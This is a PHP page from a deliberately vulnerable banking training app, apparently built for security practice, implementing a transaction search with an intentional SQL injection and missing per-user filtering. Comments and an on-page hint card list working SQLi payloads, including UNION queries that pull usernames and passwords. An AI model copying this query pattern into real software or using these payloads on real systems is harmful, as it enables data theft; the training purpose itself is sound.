<?php
// ============================================================
//  VulnBank – Transaction Search
//  INTENTIONAL VULNERABILITIES:
//    A03 – SQL injection in search term (LIKE clause, unescaped)
//    A01 – Returns transactions from ALL users, not just current user
// ============================================================
require_once 'db.php';
require '_header.php';
if (!isset($_SESSION['user_id'])) { header('Location: index.php'); exit; }

$q       = $_GET['q'] ?? '';
$results = [];
$sql_shown = '';

if ($q !== '') {
    // A03: SQL INJECTION in LIKE clause
    // Payload: %' UNION SELECT id,username,password,email,4,5,6,7,8,9 FROM users--
    // This extracts the users table via UNION injection
    //
    // Also: %' OR '1'='1  → returns all transactions
    $sql = "SELECT t.*, u1.username AS sender, u2.username AS recipient
            FROM transactions t
            LEFT JOIN users u1 ON t.from_user = u1.id
            LEFT JOIN users u2 ON t.to_user = u2.id
            WHERE t.description LIKE '%$q%'
            ORDER BY t.created_at DESC";

    $sql_shown = $sql; // A05: show the raw SQL to the user (educational)

    try {
        $results = db()->query($sql)->fetchAll();
    } catch (Exception $e) {
        // A05: Raw error exposed
        echo '<div class="alert alert-danger">DB Error: ' . $e->getMessage() . '</div>';
    }
}
?>

<div class="row justify-content-center">
  <div class="col-md-9">
    <div class="alert-vuln">
      ⚠️ <span class="badge-vuln">A03 SQL Injection</span>
      <span class="badge-vuln">A01 No ownership filter</span>
    </div>

    <div class="card shadow mb-3">
      <div class="card-header">Search Transactions</div>
      <div class="card-body">
        <form method="GET" class="d-flex gap-2" style="gap:8px">
          <input type="text" name="q" class="form-control"
                 value="<?= htmlspecialchars($q) ?>"
                 placeholder="Description keyword... or injection payload">
          <button class="btn btn-primary" style="white-space:nowrap">Search</button>
        </form>

        <?php if ($q !== ''): ?>
        <div class="mt-3 p-2 bg-light border rounded" style="font-size:.78rem">
          <strong>SQL executed:</strong><br>
          <code><?= htmlspecialchars($sql_shown) ?></code>
        </div>
        <?php endif; ?>
      </div>
    </div>

    <?php if ($q !== '' && !empty($results)): ?>
    <div class="card shadow">
      <div class="card-header"><?= count($results) ?> result(s) for "<?= htmlspecialchars($q) ?>"</div>
      <div class="table-responsive">
        <table class="table table-hover mb-0">
          <thead><tr><th>ID</th><th>From</th><th>To</th><th>Amount</th><th>Description</th><th>Date</th></tr></thead>
          <tbody>
          <?php foreach ($results as $r): ?>
          <tr>
            <td><?= $r['id'] ?></td>
            <td><?= htmlspecialchars($r['sender'] ?? $r['from_user'] ?? '?') ?></td>
            <td><?= htmlspecialchars($r['recipient'] ?? $r['to_user'] ?? '?') ?></td>
            <td><?= isset($r['amount']) ? '$'.number_format($r['amount'],2) : htmlspecialchars($r['username'] ?? '') ?></td>
            <td><?= $r['description'] ?? htmlspecialchars($r['email'] ?? '') ?></td>
            <td style="font-size:.8rem"><?= $r['created_at'] ?? '' ?></td>
          </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>
    <?php elseif ($q !== ''): ?>
    <div class="alert alert-warning">No results found.</div>
    <?php endif; ?>

    <div class="card mt-3 hint-card shadow-sm">
      <div class="card-body py-2 px-3" style="font-size:.8rem">
        <strong>A03 SQLi Payloads to try:</strong><br>
        <code>%</code> → return all transactions (wildcard)<br>
        <code>%' OR '1'='1</code> → tautology, return everything<br>
        <code>%' UNION SELECT 1,username,password,email,5,6,7 FROM users--</code> → exfiltrate users table<br>
        <code>%' AND 1=2 UNION SELECT 1,2,3,sqlite_version(),5,6,7--</code> → fingerprint DB
      </div>
    </div>
  </div>
</div>

<?php require '_footer.php'; ?>
